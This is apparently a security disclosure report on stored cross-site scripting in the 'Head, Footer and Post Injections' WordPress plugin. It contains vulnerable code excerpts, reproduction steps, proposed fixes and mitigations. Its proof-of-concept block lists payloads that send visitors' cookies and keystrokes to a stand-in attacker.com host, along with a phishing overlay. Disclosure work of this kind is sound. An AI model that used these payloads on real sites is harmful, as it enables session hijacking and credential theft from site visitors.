# Multiple Stored Cross-Site Scripting (XSS) in Head, Footer and Post Injections WordPress Plugin

---

## Basic Information

| Field | Value |
|-------|-------|
| **Title** | Stored Cross-Site Scripting (XSS) Vulnerabilities in Head, Footer and Post Injections WordPress Plugin |
| **CWE Classification** | CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') |

---

## Vulnerability Description

The WordPress plugin "Head, Footer and Post Injections" (version ≤ 3.3.6) contains multiple stored Cross-Site Scripting (XSS) vulnerabilities. The plugin allows authenticated administrators to inject arbitrary code into the `<head>`, `<body>`, `</body>`, and post content areas. The injected code is rendered without proper escaping or sanitization, enabling execution of malicious JavaScript on visiting users' browsers.

---

## Technical Details

### Affected Component

- **Plugin Name:** Head, Footer and Post Injections
- **Plugin Slug:** `header-footer`
- **Affected Versions:** ≤ 3.3.6
- **Tested Version:** 3.3.6
- **Author:** Stefano Lissa
- **Official Page:** https://www.satollo.net/plugins/header-footer
- **WordPress Repository:** https://wordpress.org/plugins/header-footer/

### Vulnerable Code Location

**File:** `wp-content/plugins/header-footer/plugin.php`

```php
// Line ~268 - hefo_execute_option() function
function hefo_execute_option($key, $echo = false) {
    global $hefo_options, $wpdb, $post;
    if (empty($hefo_options[$key]))
        return '';
    $buffer = hefo_replace($hefo_options[$key]);  // User input from admin panel
    if ($echo)
        echo hefo_execute($buffer);     // Direct output, no escaping ← XSS
    else
        return hefo_execute($buffer);
}
```

### XSS Injection Vectors

#### Vector 1 & 2: Header Injection (`wp_head` hook)

```php
// Line ~240 - hefo_wp_head_post()
add_action('wp_head', 'hefo_wp_head_post', 11);
function hefo_wp_head_post() {
    if (is_front_page()) {
        hefo_execute_option('head_home', true);  // ← XSS Vector 1 (Home page only)
    }
    hefo_execute_option('head', true);            // ← XSS Vector 2 (Every page)
}
```

#### Vector 3: Footer Injection (`wp_footer` hook)

```php
// Line ~220 - hefo_wp_footer()
add_action('wp_footer', 'hefo_wp_footer');
function hefo_wp_footer() {
    hefo_execute_option('footer', true);          // ← XSS Vector 3
}
```

#### Vector 4 & 5: Post Content Injection (`the_content` hook)

```php
// Line ~180 - hefo_the_content()
add_action('the_content', 'hefo_the_content');
function hefo_the_content($content) {
    global $hefo_options, $wpdb, $post, $hefo_is_mobile;
    
    $before = '';
    $after = '';

    if (!is_singular()) {
        return $content;
    }

    // ...
    $before = hefo_execute_option($type . 'before');   // ← XSS Vector 4
    $after = hefo_execute_option($type . 'after');     // ← XSS Vector 5
    
    return $before . $content . $after;
}
```

#### Vector 6-10: Page / CPT Injections

```php
// Same the_content hook, but with 'page_' prefix for pages
$before = hefo_execute_option('page_before');   // ← XSS Vector 6
$after = hefo_execute_option('page_after');     // ← XSS Vector 7

// Custom post types
$before = hefo_execute_option($post_type . '_before'); // ← XSS Vector 8-10
```

#### Vector 11-15: Inner Post Injections

```php
// Line ~208 - Rules for inner post injection
for ($i = 1; $i <= 5; $i++) {
    // Inner injection before/after specific HTML tags
    hefo_execute_option('inner_' . $i);           // ← XSS Vectors 11-15
}
```

#### Vector 16-17: Excerpt Injections

```php
// Line ~316 - hefo_the_excerpt()
function hefo_the_excerpt($content) {
    $before = hefo_execute_option('excerpt_before'); // ← XSS Vector 16
    $after = hefo_execute_option('excerpt_after');   // ← XSS Vector 17
    return $before . $content . $after;
}
```

---

## Proof of Concept (PoC)

### Step-by-step Reproduction

1. Login to WordPress admin dashboard

   ![test7](D:\test7.png)

2. Navigate to: **Settings → Header & Footer**

3. Go to the **"Posts"** tab

4. In the **"Before the post content"** field, inject:
   ```html
   <script>alert('XSS-Test')</script>
   ```

5. Click **"Save"** to persist the configuration

   ![test8](D:\test8.png)

6. Visit any post page on the frontend

7. The malicious script executes automatically, displaying an alert popup

   ![test9](D:\test9.png)

### PoC Payload Examples

```html
<!-- Basic XSS -->
<script>alert('XSS-Test')</script>

<!-- Cookie Stealing -->
<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('https://attacker.com/key?k='+e.key)}</script>

<!-- Phishing Overlay -->
<img src=x onerror="document.body.innerHTML='<div style=...>Login Required</div>'">
```

---

## Impact

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Confidentiality** | **High** | Session cookies, personal data, and sensitive information can be exfiltrated |
| **Integrity** | **Medium** | Content manipulation, phishing overlays, and defacement possible |
| **Availability** | **Low** | JavaScript errors could disrupt page rendering |

### Attack Scenarios

1. **Session Hijacking:** Steal admin cookies to gain unauthorized access
2. **Phishing:** Display fake login forms to steal credentials
3. **Malware Distribution:** Redirect users to malicious download sites
4. **Content Manipulation:** Alter page content to spread misinformation
5. **Widespread Impact:** Since code is stored in global plugin settings (not per-post), any user with privileges to view the affected pages is vulnerable

---

## Root Cause

The vulnerability exists because the plugin stores user-supplied code from the admin configuration panel and outputs it directly into WordPress hooks (`wp_head`, `wp_footer`, `the_content`, etc.) without any sanitization, escaping, or validation.

Key issues:
1. **No input sanitization** - User input is stored as-is in the `wp_hefo` option
2. **No output escaping** - `hefo_execute_option()` echoes/returns unsanitized content
3. **Multiple entry points** - Over 15 different injection points in the plugin

---

## Recommended Fix

### Immediate Code Fix

```php
// Fix for hefo_execute_option() function in plugin.php
function hefo_execute_option($key, $echo = false) {
    global $hefo_options, $wpdb, $post;
    if (empty($hefo_options[$key]))
        return '';
    $buffer = hefo_replace($hefo_options[$key]);
    if ($echo)
        echo wp_kses(hefo_execute($buffer), array(
            'script' => array(),
            'style'  => array(),
            // Define allowed HTML tags and attributes as needed
        ));
    else
        return wp_kses(hefo_execute($buffer), array(
            'script' => array(),
            'style'  => array(),
        ));
}
```

### Alternative Fix (Stricter)

```php
// Using esc_html to completely prevent HTML injection
if ($echo)
    echo esc_html(hefo_execute($buffer));
else
    return esc_html(hefo_execute($buffer));
```

### Temporary Mitigation

1. **Disable the plugin** if not strictly required
2. **Restrict administrator account access** to only trusted users
3. **Add to `wp-config.php`:**
   ```php
   define('HEADER_FOOTER_ALLOW_PHP', false);
   ```
4. **Use alternative plugin** with better security practices

---

## Additional Notes

### Plugin Status
- This plugin is still actively maintained in the WordPress repository
- Version 3.3.6 is the latest version at the time of discovery
- Vulnerability exists across all plugin settings that accept user code input

### Related Vulnerabilities
- The plugin also contains a **PHP Code Injection** vulnerability (CWE-94) that requires `enable_php = 1` to be exploitable
- Both vulnerabilities share the same code path (`hefo_execute()` function in `plugin.php`)

---

## References

- Plugin Official Page: https://www.satollo.net/plugins/header-footer
- WordPress Plugin Repository: https://wordpress.org/plugins/header-footer/
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

---

## Contact

- **Reporter:** [chengqihong]
- **Email:** [chengqh927@163.com]
- **Date:** 2026-07-01
